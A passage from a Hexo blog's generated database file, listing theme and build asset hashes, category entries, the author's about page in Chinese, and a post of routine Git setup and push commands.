87e00ff04d18b5c83283b049a4d","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/keyframes.styl","hash":"94065ea50f5bef7566d184f2422f6ac20866ba22","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_category/category-bar.styl","hash":"99e8e25e84d513b869a17140f63a5c1e48a0e7e1","modified":1657764127371},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_category/category-chain.styl","hash":"0cdf7ef50dfd0669d3b257821384ff31cd81b7c9","modified":1657764127371},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_category/category-list.styl","hash":"7edfe1b571ecca7d08f5f4dbcf76f4ffdcfbf0b5","modified":1657764127371},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_index/index.styl","hash":"0acbd71633bcc7191672ea4e1b2277bea350d73b","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_links/links.styl","hash":"5c7f2044e3f1da05a3229537c06bd879836f8d6e","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_post/comment.styl","hash":"780f3788e7357bcd3f3262d781cb91bb53976a93","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_post/highlight.styl","hash":"7054d79c9d5966fc57baf0adcdf3b19275987b62","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_post/markdown.styl","hash":"1e3d3a82721e7c10bcfcecec6d81cf2979039452","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_post/post-page.styl","hash":"127bb5391370afe7fef2a297084d76406bc5e902","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_post/post-tag.styl","hash":"27f70062415ccf66a9b6f4952db124fc1471fda5","modified":1657764127378},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_tag/tags.styl","hash":"65bfc01c76abc927fa1a23bf2422892b0d566c3f","modified":1657764127378},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/anchorjs.styl","hash":"e0cebda4a6f499aff75e71417d88caa7ceb13b94","modified":1657764127371},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/banner.styl","hash":"7a0bd629bc234fc75e3cc8e3715ffada92f09e73","modified":1657764127371},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/board.styl","hash":"4397037fc3f0033dbe546c33cd9dbdabd8cb1632","modified":1657764127371},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/code-widget.styl","hash":"b66ab013f0f37d724a149b85b3c7432afcf460ad","modified":1657764127371},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/copyright.styl","hash":"26f71a9cd60d96bb0cb5bbdf58150b8e524d9707","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/footer.styl","hash":"2caaca71dd1ff63d583099ed817677dd267b457e","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/footnote.styl","hash":"ae9289cc89649af2042907f8a003303b987f3404","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/header.styl","hash":"896179810e1ee986208ae2d57a44719f6b839bde","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/modal.styl","hash":"adf6c1e5c8e1fb41c77ce6e2258001df61245aa2","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/ngrogress.styl","hash":"5d225357b4a58d46118e6616377168336ed44cb2","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/noscript.styl","hash":"0cf2f2bb44f456150d428016675d5876a9d2e2aa","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/pagination.styl","hash":"8bb1b68e5f3552cb48c2ffa31edbc53646a8fb4c","modified":1657764127374},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/qrcode.styl","hash":"78704a94c0436097abfb0e0a57abeb3429c749b7","modified":1657764127378},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/scroll-btn.styl","hash":"f0e429a27fa8a7658fcbddbb4d4dbe4afa12499a","modified":1657764127378},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/search.styl","hash":"10f7e91a91e681fb9fe46f9df7707b9ef78707c8","modified":1657764127378},{"_id":"node_modules/hexo-theme-fluid/source/css/_pages/_base/_widget/toc.styl","hash":"9e7452aa2372153f25d7a4675c9d36d281a65d24","modified":1657764127378},{"_id":"node_modules/hexo-theme-fluid/source/img/default.png","hash":"167a12978d80371cf578c8a2e45c24a2eb25b6fb","modified":1657764126948},{"_id":"source/img/article/信息收集/appinfoscanner.png","hash":"324206678904d01a67f5aa5416f6e7e712a6f1ad","modified":1657764375726},{"_id":"source/img/b-forest.jpg","hash":"6094df274f6e002ec7ad4bd16f3b7148a2ccdd4e","modified":1657764375726},{"_id":"source/img/bg.jpg","hash":"5c092a661e891db8e3ff949f638922e671231ae7","modified":1657764375726},{"_id":"public/local-search.xml","hash":"e995d9949a09f19d84c4e1055af9d84337b7da2e","modified":1660150008934},{"_id":"public/about/index.html","hash":"2dd32fbddf9974aa50ae734ed7166f7c54146fa3","modified":1660150008934},{"_id":"public/archives/index.html","hash":"6aedc0b0d1f2afe1ab70d3491e3efe4b868e2ece","modified":1660150008934},{"_id":"public/archives/2022/index.html","hash":"6aedc0b0d1f2afe1ab70d3491e3efe4b868e2ece","modified":1660150008934},{"_id":"public/archives/2022/05/index.html","hash":"bd5742289a92250644a0c9c70db3603fb159e797","modified":1660150008934},{"_id":"public/archives/2022/06/index.html","hash":"7e8660b0eb5e33e8077bfc515d877c793fb4f6e0","modified":1660150008934},{"_id":"public/archives/2022/07/index.html","hash":"8152ae094735ac915a876871806c259783b2c2d9","modified":1660150008934},{"_id":"public/archives/2022/08/index.html","hash":"45481628b9e98612279a5925dd5d22be38fd9b1c","modified":1660150008934},{"_id":"public/categories/Security/index.html","hash":"0e0f9a8d5a957a4cdd2a986eb003594c262b433a","modified":1660150008934},{"_id":"public/categories/Linux/index.html","hash":"1df4accb494c7fdc1aa7486e1ad44f463ad8063a","modified":1660150008934},{"_id":"public/categories/ssh/index.html","hash":"44390e6b3aa7aff1dd0a0f0929317f5219be0645","modified":1660150008934},{"_id":"public/categories/Security/PenTest/index.html","hash":"19603a7a0538259b9ec67f663d1b8f607ffa81f7","modified":1660150008934},{"_id":"public/categories/Linux/Gentoo/index.html","hash":"00348cab1e218073703572b77c8ec35680956026","modified":1660150008934},{"_id":"public/categories/Linux/kvm/index.html","hash":"9ecab68dea2fd64181878f6a32cf7ff3bbc59257","modified":1660150008934},{"_id":"public/categories/ssh/sshfs/index.html","hash":"2cdb8bc8a353b901af85fc8c6e9d9369a59f86cf","modified":1660150008934},{"_id":"public/categories/Security/PenTest/经典漏洞/index.html","hash":"b04c5d915fa211c2769a8be43aa5fd63a7fb986f","modified":1660150008934},{"_id":"public/categories/Security/PenTest/信息收集/index.html","hash":"27b60ef2a266f2b4d91c6a7a2667b4a46f1c0f31","modified":1660150008934},{"_id":"public/categories/Security/audit/index.html","hash":"397663bfa41c7a69a0c482656e1d343c6a775f77","modified":1660150008934},{"_id":"public/categories/Security/audit/XSS/index.html","hash":"e959cbc50da4485ea8f85f06a2a7d6bc2d68b564","modified":1660150008934},{"_id":"public/tags/Security/index.html","hash":"3de9f7ae1b84bed33d959fb44494c28f6ab7dad7","modified":1660150008934},{"_id":"public/tags/PenTest/index.html","hash":"e3589672c9121940b4bf241e81e435b989327bcc","modified":1660150008934},{"_id":"public/tags/信息收集/index.html","hash":"e7e261d0433ae3653a456b29dbfdd8c1104f9378","modified":1660150008934},{"_id":"public/tags/经典漏洞/index.html","hash":"33e002290adcac5342d701c3908884ba3eb4e491","modified":1660150008934},{"_id":"public/tags/Linux/index.html","hash":"411a1578174cea688bf86609a3d2fe5b1ba35cf9","modified":1660150008934},{"_id":"public/tags/Gentoo/index.html","hash":"3199bae6bf5044c3f425ed65118d00b579e3f630","modified":1660150008934},{"_id":"public/tags/kvm/index.html","hash":"fd4813fbd856ee37982d94fa7ebd56b4e5aee81d","modified":1660150008934},{"_id":"public/tags/ssh/index.html","hash":"2287f897a91a00f63976567117c396ef3e49ddeb","modified":1660150008934},{"_id":"public/tags/sshfs/index.html","hash":"5b652e7ece51b4f7578fdbe0b65175923ad00f11","modified":1660150008934},{"_id":"public/tags/audit/index.html","hash":"7f95ce62e1695f5e3713e5ad1639b7f55e2f2815","modified":1660150008934},{"_id":"public/tags/XSS/index.html","hash":"7d4196d5e7f9b9bc67fa493e4ed0cab4eb7a6f10","modified":1660150008934},{"_id":"public/404.html","hash":"722122dfda13f2aa3490aeabf97afb1bd77b7af5","modified":1660150008934},{"_id":"public/tags/index.html","hash":"d2b6334c4c6ecb2f14034cec14f18f781e578c67","modified":1660150008934},{"_id":"public/links/index.html","hash":"ec72388c950d4c8567f514451d0b6f4c7cf88bde","modified":1660150008934},{"_id":"public/2022/08/04/0000-00-01.docker环境/index.html","hash":"628e2db9cd37526a493142a7d5b86e9fb7b30734","modified":1660150008934},{"_id":"public/2022/08/04/2022-08-04.经典漏洞-SQL注入/index.html","hash":"68cb5a8471f0a5f1f93e652f4db3ccda34ccc48e","modified":1660150008934},{"_id":"public/2022/08/04/2022-08-10.耗子XSS/index.html","hash":"1ce1bf87433996db4b7ae8bb7c8716dc2491594b","modified":1660150008934},{"_id":"public/2022/07/21/2022-07-21.经典漏洞-XSS/index.html","hash":"351d8116adca974c4330ee13421873d9ef75a664","modified":1660150008934},{"_id":"public/2022/07/20/2022-07-20.sshfs/index.html","hash":"28bc470f4ebef136a4d1b677282c3d8e08b9d4c5","modified":1660150008934},{"_id":"public/2022/07/14/2022-07-14.kvm显卡直通/index.html","hash":"08ebfede46e1f2c6f4a4ab190b476127065f47da","modified":1660150008934},{"_id":"public/2022/07/04/2022-07-04.gentoo配置手册/index.html","hash":"6b8cf85d1cb6f982665a64df93a7471862d9e625","modified":1660150008934},{"_id":"public/2022/06/17/2022-06-17.经典漏洞-弱口令/index.html","hash":"1054b3cc1298d6f2415f20e18b2a43638acfb982","modified":1660150008934},{"_id":"public/2022/05/30/2022-05-30.信息收集/index.html","hash":"e1a225e43e2176c60c1aa9f799f0a53e8cc032ea","modified":1660150008934},{"_id":"public/2022/05/23/0000-00-00.示例git/index.html","hash":"96f25924bb101e2fa6a86a0e6f838eeaf8eab31a","modified":1660150008934},{"_id":"public/index.html","hash":"ad85c6fe65e8216e1814249f5ff0675dfb76ece8","modified":1660150008934},{"_id":"public/categories/index.html","hash":"a13398319bcd09d87da6b50d0f58a4e8d5bf7abd","modified":1660150008934},{"_id":"public/img/avatar.png","hash":"fe739a158cc128f70f780eb5fa96f388b81d478f","modified":1660150008934},{"_id":"public/img/loading.gif","hash":"2d2fc0f947940f98c21afafef39ecf226a2e8d55","modified":1660150008934},{"_id":"public/img/police_beian.png","hash":"90efded6baa2dde599a9d6b1387973e8e64923ea","modified":1660150008934},{"_id":"public/img/fluid.png","hash":"64b215db2cb3af98fe639e94537cb5209f959c78","modified":1660150008934},{"_id":"public/xml/local-search.xml","hash":"8c96ba6a064705602ce28d096fd7dd9069630a55","modified":1660150008934},{"_id":"public/img/webicon.png","hash":"581a3911627a97a3de9c565669086f3893b20f57","modified":1660150008934},{"_id":"public/img/article-head/gentoo.jpeg","hash":"8832115a7c634c1b4cd7bd777217c8eafa94cee2","modified":1660150008934},{"_id":"public/img/article-head/kvm.jpeg","hash":"c70f3739e5d9a48d7cc8aba89547b49b572d130c","modified":1660150008934},{"_id":"public/img/article-head/sshfs.png","hash":"4e0bd0b7723f8b41e10f53e95ebcad9ff66d6fa1","modified":1660150008934},{"_id":"public/img/article-head/弱口令.jpeg","hash":"9fe217dd03d6ffc0547cd3178116f881781391b7","modified":1660150008934},{"_id":"public/img/article-head/信息收集.jpeg","hash":"5b9949976db6756bbc1bc2a0ec87786a96573d73","modified":1660150008934},{"_id":"public/css/highlight-dark.css","hash":"2b0daa6e5343da9dbb26d617d224b8397e48556b","modified":1660150008934},{"_id":"public/css/gitalk.css","hash":"a57b3cc8e04a0a4a27aefa07facf5b5e7bca0e76","modified":1660150008934},{"_id":"public/css/highlight.css","hash":"0f9a477d33d3b15ebe7e163e756fb7c54c7ded6b","modified":1660150008934},{"_id":"public/js/boot.js","hash":"2848f8eb5081a7f0550fbd76dc06d3ff877f1913","modified":1660150008934},{"_id":"public/js/events.js","hash":"f05a569a9fd6da2fda69a2cf8e276ba81580faf3","modified":1660150008934},{"_id":"public/js/color-schema.js","hash":"ba63f7c3324bc1fdd050a90add9d8faaffc27e07","modified":1660150008934},{"_id":"public/js/img-lazyload.js","hash":"cbdeca434ec4da51f488c821d51b4d23c73294af","modified":1660150008934},{"_id":"public/js/leancloud.js","hash":"eff77c7a5c399fcaefda48884980571e15243fc9","modified":1660150008934},{"_id":"public/js/local-search.js","hash":"cebcda5991b6a9ab9307c69542389ce9013f04f7","modified":1660150008934},{"_id":"public/js/plugins.js","hash":"2333494add51e5e1374602a4e81f0be36a05d4c2","modified":1660150008934},{"_id":"public/js/utils.js","hash":"45cc86f099db0a2c36ad49711ce66c2d598a2ab1","modified":1660150008934},{"_id":"public/css/main.css","hash":"94f9e394de6d759eaeb0d9eaba2588057e3e935d","modified":1660150008934},{"_id":"public/img/article/信息收集/WebScan.png","hash":"596c7d8921418d70f99b45a6e5b82b71fd5fd301","modified":1660150008934},{"_id":"public/img/article/信息收集/fofa.png","hash":"520289bb9cf4651a24658eb4cef1315f33eb46eb","modified":1660150008934},{"_id":"public/img/article/信息收集/猎人在线.png","hash":"1c52f9b2269aba4a1e932ae7a5c28c752da3d87b","modified":1660150008934},{"_id":"public/img/touxiang.jpg","hash":"18038c437d8e08eae594b43ad15cecc7ec9da102","modified":1660150008934},{"_id":"public/img/article/信息收集/email-format.png","hash":"5554e059c34287098c6ccd0ffe4ef9d7c4b06f8d","modified":1660150008934},{"_id":"public/img/article/信息收集/shodan.png","hash":"0a796a656193d53edbaef894d6e1ceee418aeb0e","modified":1660150008934},{"_id":"public/img/article/信息收集/全球DNS搜索引擎.png","hash":"0f791ae2e185f0c210a58b099f8e680cc66830a7","modified":1660150008934},{"_id":"public/img/article-head/example.jpg","hash":"8cbaf5db5a0169b005b0582f8a28b8e413f6a4a6","modified":1660150008934},{"_id":"public/img/article/XSS/反射型xss.png","hash":"3f927a5dc1f8062e020f3997d89504f91b17107b","modified":1660150008934},{"_id":"public/img/article/XSS/存储型xss.png","hash":"d970e93dbbbe779386084d6c2f6cddad6e9d342e","modified":1660150008934},{"_id":"public/img/article/信息收集/Netcraft.png","hash":"c9b6e321c8c80a1b9757e8d4c0704f28ef805db0","modified":1660150008934},{"_id":"public/img/article/信息收集/ip段.png","hash":"bc9413692446c9f09ef96511d459f3298f94a81c","modified":1660150008934},{"_id":"public/img/article/信息收集/钟馗之眼.png","hash":"a2a9fa78b81ff976633a547189937fdebd802617","modified":1660150008934},{"_id":"public/img/article-head/XSS.png","hash":"7b5982b9af6041372f41c865b1090c783e2d07b0","modified":1660150008934},{"_id":"public/img/default.png","hash":"167a12978d80371cf578c8a2e45c24a2eb25b6fb","modified":1660150008934},{"_id":"public/img/article/信息收集/微步在线.png","hash":"230cdde417498e91c162d053673cb9be4f1ff9d5","modified":1660150008934},{"_id":"public/img/article/信息收集/appinfoscanner.png","hash":"324206678904d01a67f5aa5416f6e7e712a6f1ad","modified":1660150008934},{"_id":"public/img/b-forest.jpg","hash":"6094df274f6e002ec7ad4bd16f3b7148a2ccdd4e","modified":1660150008934},{"_id":"public/img/bg.jpg","hash":"5c092a661e891db8e3ff949f638922e671231ae7","modified":1660150008934}],"Category":[{"name":"git","_id":"cl6nug9ay0003oqna7y9w6ivj"},{"name":"docker","_id":"cl6nug9b10008oqna30iz1ief"},{"name":"Security","_id":"cl6nug9b3000eoqna79r98edx"},{"name":"Linux","_id":"cl6nug9b5000moqna2tvce1vf"},{"name":"ssh","_id":"cl6nug9b6000roqna0j1r6mhq"},{"name":"PenTest","parent":"cl6nug9b3000eoqna79r98edx","_id":"cl6nug9b6000voqnad3lngxi7"},{"name":"Gentoo","parent":"cl6nug9b5000moqna2tvce1vf","_id":"cl6nug9b80017oqnaesyd9zde"},{"name":"kvm","parent":"cl6nug9b5000moqna2tvce1vf","_id":"cl6nug9b8001aoqnad5t1bpjo"},{"name":"sshfs","parent":"cl6nug9b6000roqna0j1r6mhq","_id":"cl6nug9b8001eoqnactyhe3ss"},{"name":"经典漏洞","parent":"cl6nug9b6000voqnad3lngxi7","_id":"cl6nug9b9001joqnaaxui8q38"},{"name":"信息收集","parent":"cl6nug9b6000voqnad3lngxi7","_id":"cl6nug9b9001ooqnagwxa3yo3"},{"name":"audit","parent":"cl6nug9b3000eoqna79r98edx","_id":"cl6nug9bc002goqna95y9bc2f"},{"name":"XSS","parent":"cl6nug9bc002goqna95y9bc2f","_id":"cl6nug9bc002ioqnaf9tgdujo"}],"Data":[],"Page":[{"title":"about","date":"2022-07-14T03:04:25.000Z","layout":"about","_content":"\n## 欢迎来到 miloo 的博客\n\nmiloo, 菜鸟黑客一枚。\n\n热爱开源文化，linux 爱好者，解决问题请联系我。\n\n由于记忆力下降严重，许多研究及学习经验用博客记录，方便个人查阅及他人参考。笔记只起到抛砖引玉的作用，如有不足请不吝赐教。\n\n##### 人生格言：I am a pessimist. Others fight for victory, I am not. I always fight and occasionally win！\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2022-07-14 11:04:25\nlayout: about\n---\n\n## 欢迎来到 miloo 的博客\n\nmiloo, 菜鸟黑客一枚。\n\n热爱开源文化，linux 爱好者，解决问题请联系我。\n\n由于记忆力下降严重，许多研究及学习经验用博客记录，方便个人查阅及他人参考。笔记只起到抛砖引玉的作用，如有不足请不吝赐教。\n\n##### 人生格言：I am a pessimist. Others fight for victory, I am not. I always fight and occasionally win！\n","updated":"2022-07-30T17:55:16.862Z","path":"about/index.html","comments":1,"_id":"cl6nug9ax0001oqna4vpg562w","content":"<h2 id=\"欢迎来到-miloo-的博客\"><a href=\"#欢迎来到-miloo-的博客\" class=\"headerlink\" title=\"欢迎来到 miloo 的博客\"></a>欢迎来到 miloo 的博客</h2><p>miloo, 菜鸟黑客一枚。</p>\n<p>热爱开源文化，linux 爱好者，解决问题请联系我。</p>\n<p>由于记忆力下降严重，许多研究及学习经验用博客记录，方便个人查阅及他人参考。笔记只起到抛砖引玉的作用，如有不足请不吝赐教。</p>\n<h5 id=\"人生格言：I-am-a-pessimist-Others-fight-for-victory-I-am-not-I-always-fight-and-occasionally-win！\"><a href=\"#人生格言：I-am-a-pessimist-Others-fight-for-victory-I-am-not-I-always-fight-and-occasionally-win！\" class=\"headerlink\" title=\"人生格言：I am a pessimist. Others fight for victory, I am not. I always fight and occasionally win！\"></a>人生格言：I am a pessimist. Others fight for victory, I am not. I always fight and occasionally win！</h5>","site":{"data":{}},"wordcount":189,"excerpt":"","more":"<h2 id=\"欢迎来到-miloo-的博客\"><a href=\"#欢迎来到-miloo-的博客\" class=\"headerlink\" title=\"欢迎来到 miloo 的博客\"></a>欢迎来到 miloo 的博客</h2><p>miloo, 菜鸟黑客一枚。</p>\n<p>热爱开源文化，linux 爱好者，解决问题请联系我。</p>\n<p>由于记忆力下降严重，许多研究及学习经验用博客记录，方便个人查阅及他人参考。笔记只起到抛砖引玉的作用，如有不足请不吝赐教。</p>\n<h5 id=\"人生格言：I-am-a-pessimist-Others-fight-for-victory-I-am-not-I-always-fight-and-occasionally-win！\"><a href=\"#人生格言：I-am-a-pessimist-Others-fight-for-victory-I-am-not-I-always-fight-and-occasionally-win！\" class=\"headerlink\" title=\"人生格言：I am a pessimist. Others fight for victory, I am not. I always fight and occasionally win！\"></a>人生格言：I am a pessimist. Others fight for victory, I am not. I always fight and occasionally win！</h5>"}],"Post":[{"title":"Git global setup","excerpt":"git push","index_img":"/img/article-head/---.jpeg","date":"2022-05-23T12:46:25.000Z","updated":"2022-06-07T02:46:25.000Z","hide":true,"_content":"\n# Git global setup\n\n```\ngit config --global user.name \"miloo\"\ngit config --global user.email \"miloo@worisur\"\n```\n\n# Create a new repository\n```\ngit clone git@gitlab.com:imiloo/imiloo.gitlab.io.git\ncd imiloo.gitlab.io\ngit switch -c main\ntouch README.md\ngit add README.md\ngit commit -m \"add README\"\ngit push -u origin main\n```\n\n# Push an existing folder\n```\ncd existing_folder\ngit init --initial-branch=main\ngit remote add origin git@gitlab.com:imiloo/imiloo.gitlab.io.git\ngit add .\ngit commit -m \"Initial commit\"\ngit push -u origin main\n```\n\n# Push an existing Git repository\n```\ncd existing_repo\ngit switch -c main\ngit remote rename origin old-origin\ngit remote add origin git@gitlab.com:imiloo/imiloo.gitlab.io.git\ngit commit -m \"update blog\"\ngit push -u origin --all\ngit push -u origin --tags\n```\n\n# 日常使用\n```\ngit add .\ngit switch -c main\ngit remote rename origin old-origin\ngit remote add origin git@github.com:imiloo/imiloo.github.io.git\ngit commit -m \"update blog\"\ngit push -u origin --all\ngit push -u origin --tags\n```\n\n```\ngit add .\ngit switch -c main\ngit remote rename origin old-origin\ngit remote add origin git@gitlab.com:imiloo/imiloo.gitlab.io.git\ngit commit -m \"update blog\"\ngit push -u origin --all\ngit push -u origin --tags\n```\n\n# 删除文件\n\n1. 克隆远程仓库到本地库,例如使用ssh方法：\n```\ngit clone git@github.com:xxx/xxx.git\n```\n2. 对需要删除的文件、文件夹进行如下操作:\n```\ngit rm test.txt (删除文件)\ngit rm -r test (删除文件夹)\n```\n3. 提交修改\n```\ngit commit -m \"Delete some files.\"\n```\n4. 将修改提交到远程仓库的xxx分支:\n```\ngit push origin xxx\n```\n\n# 删除远程仓库 但不删本地资源\n\n把xxx.iml加到`.gitignore`里面忽略掉，然后提交使.gitignore生效，既:\n```\ngit rm -r --cached xxx.iml　　//-r 是递归的意思   当最后面是文件夹的时候有用\ngit add xxx.iml　　　　　 //若.gitignore文件中已经忽略了xxx.iml则可以不用执行此句\ngit commit -m \"ignore xxx.xml\"\ngit push\n```","source":"_posts/0000-00-00.示例git.md","raw":"---\ntitle: Git global setup\nexcerpt: git push\nindex_img: /img/article-head/---.jpeg\ndate: \"2022/5/23 20:46:25\"\nupdated: \"2022/6/7 10:46:25\"\nhide: true\ntags:\n- git\ncategories:\n- git\n---\n\n# Git global setup\n\n```\ngit config --global user.name \"miloo\"\ngit config --global user.email \"miloo@worisur\"\n```\n\n# Create a new repository\n```\ngit clone git@gitlab.com:imiloo/imiloo.gitlab.io.git\ncd imiloo.gitlab.io\ngit switch -c main\ntouch README.md\ngit add README.md\ngit commit -m \"add README\"\ngit push -u origin main\n```\n\n# Push an existing folder\n```\ncd existing_folder\ngit init --initial-branch=main\ngit remote add origin git@gitlab.com:imiloo/imiloo.gitlab.io.git\ngit add .\ngit commit -m \"Initial commit\"\ngit push -u origin main\n```\n\n# Push an existing Git repository\n```\ncd existing_repo\ngit switch -c main\ngit remote rename origin old-origin\ngit remote add origin git@gitlab.com:imiloo/imiloo.gitlab.io.git\ngit commit -m \"update blog\"\ngit push -u origin --all\ngit push -u origin --tags\n```\n\n# 日常使用\n```\ngit add .\ngit switch -c main\ngit remote rename origin old-origin\ngit remote add origin git@github.com:imiloo/imiloo.github.io.git\ngit commit -m \"update blog\"\ngit push -u origin --all\ngit push -u origin --tags\n```\n\n```\ngit add .\ngit switch -c main\ngit remote rename origin old-origin\ngit remote add origin git@gitlab.com:imiloo/imiloo.gitlab.io.git\ngit commit -m \"update blog\"\ngit push -u origin --all\ngit push -u origin --tags\n```\n\n# 删除文件\n\n1. 克隆远程仓库到本地库,例如使用ssh方法：\n```\ngit clone git@github.com:xxx/xxx.git\n```\n2. 对需要删除的文件、文件夹进行如下操作:\n```\ngit rm test.txt (删除文件)\ngit rm -r test (删除文件夹)\n```\n3. 提交修改\n```\ngit commit -m \"Delete some files.\"\n```\n4. 将修改提交到远程仓库的xxx分支:\n```\ngit push origin xxx\n```\n\n# 删除远程仓库 但不删本地资源\n\n把xxx.iml加到`.gitignore`里面忽略掉，然后提交使.gitignore生效，既:\n```\ngit rm -r --cached xxx.iml　　//-r 是递归的意思   当最后面是文件夹的时候有用\ngit add xxx.iml　　　　　 //若.gitignore文件中已经忽略了xxx.iml则可以不用执行此句\ngit commit -m \"ignore xxx.xml\"\ngit push\n```","slug":"0000-00-00.示例git","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9au0000oqnadbfzhubv","content":"<h1 id=\"Git-global-setup\"><a href=\"#Git-global-setup\" class=\"headerlink\" title=\"Git global setup\"></a>Git global setup</h1><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">git config <span class=\"hljs-attr\">--global</span> user<span class=\"hljs-selector-class\">.name</span> <span class=\"hljs-string\">&quot;miloo&quot;</span><br>git config <span class=\"hljs-attr\">--global</span> user<span class=\"hljs-selector-class\">.email</span> <span class=\"hljs-string\">&quot;miloo@worisur&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Create-a-new-repository\"><a href=\"#Create-a-new-repository\" class=\"headerlink\" title=\"Create a new repository\"></a>Create a new repository</h1><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">git clone git@gitlab<span class=\"hljs-selector-class\">.com</span>:imiloo/imiloo<span class=\"hljs-selector-class\">.gitlab</span><span class=\"hljs-selector-class\">.io</span><span class=\"hljs-selector-class\">.git</span><br>cd imiloo<span class=\"hljs-selector-class\">.gitlab</span><span class=\"hljs-selector-class\">.io</span><br>git switch -c <span class=\"hljs-selector-tag\">main</span><br>touch README<span class=\"hljs-selector-class\">.md</span><br>git add README<span class=\"hljs-selector-class\">.md</span><br>git commit -m <span class=\"hljs-string\">&quot;add README&quot;</span><br>git push -u origin main<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Push-an-existing-folder\"><a href=\"#Push-an-existing-folder\" class=\"headerlink\" title=\"Push an existing folder\"></a>Push an existing folder</h1><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">cd existing_folder<br>git init <span class=\"hljs-attribute\">--initial-branch</span>=main<br>git remote <span class=\"hljs-built_in\">add</span> origin git@gitlab.com:imiloo/imiloo.gitlab.io.git<br>git <span class=\"hljs-built_in\">add</span> .<br>git commit -m <span class=\"hljs-string\">&quot;Initial commit&quot;</span><br>git push -u origin main<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Push-an-existing-Git-repository\"><a href=\"#Push-an-existing-Git-repository\" class=\"headerlink\" title=\"Push an existing Git repository\"></a>Push an existing Git repository</h1><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">cd existing_repo<br>git switch -c <span class=\"hljs-selector-tag\">main</span><br>git remote rename origin old-origin<br>git remote add origin git@gitlab<span class=\"hljs-selector-class\">.com</span>:imiloo/imiloo<span class=\"hljs-selector-class\">.gitlab</span><span class=\"hljs-selector-class\">.io</span><span class=\"hljs-selector-class\">.git</span><br>git commit -m <span class=\"hljs-string\">&quot;update blog&quot;</span><br>git push -u origin <span class=\"hljs-attr\">--all</span><br>git push -u origin <span class=\"hljs-attr\">--tags</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"日常使用\"><a href=\"#日常使用\" class=\"headerlink\" title=\"日常使用\"></a>日常使用</h1><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\">git <span class=\"hljs-keyword\">add</span> .<br>git switch <span class=\"hljs-operator\">-</span>c main<br>git remote rename origin <span class=\"hljs-keyword\">old</span><span class=\"hljs-operator\">-</span>origin<br>git remote <span class=\"hljs-keyword\">add</span> origin git<span class=\"hljs-variable\">@github</span>.com:imiloo<span class=\"hljs-operator\">/</span>imiloo.github.io.git<br>git <span class=\"hljs-keyword\">commit</span> <span class=\"hljs-operator\">-</span>m &quot;update blog&quot;<br>git push <span class=\"hljs-operator\">-</span>u origin <span class=\"hljs-comment\">--all</span><br>git push <span class=\"hljs-operator\">-</span>u origin <span class=\"hljs-comment\">--tags</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\">git <span class=\"hljs-keyword\">add</span> .<br>git switch 